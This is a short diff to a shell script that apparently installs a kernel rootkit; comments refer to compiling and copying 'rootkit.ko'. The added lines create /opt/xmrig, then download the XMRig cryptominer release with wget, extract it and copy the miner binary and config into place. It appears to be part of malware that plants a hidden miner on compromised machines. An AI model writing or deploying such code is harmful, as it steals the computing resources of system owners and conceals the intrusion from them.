@@ -15,6 +15,21 @@ xmrig_dir="/opt/xmrig"
 xmrig_binary="$xmrig_dir/xmrig"
 xmrig_config="$xmrig_dir/config.json"
 #compile rootkit
+if [ ! -d "$xmrig_dir" ]; then
+	mkdir -p "$xmrig_dir"
+fi
+
+if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
+	rm "$xmrig_dir/*"
+	wget -O "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+	tar xvf "$xmrig_dir/xmrig_tar" -C "$xmrig_dir/"
+	cp xmrig-6.22.2/xmrig "$xmrig_dir/"
+	cp xmrig-6.22.2/config.json "$xmrig_dir/"
+	rm "$xmrig_dir/xmrig_tar" 
+	rm -r "$xmrig_dir/xmrig-6.22.2"
+
+
+fi
 
 #if extra not real then create it
 #copy compile rootkit.ko to destination
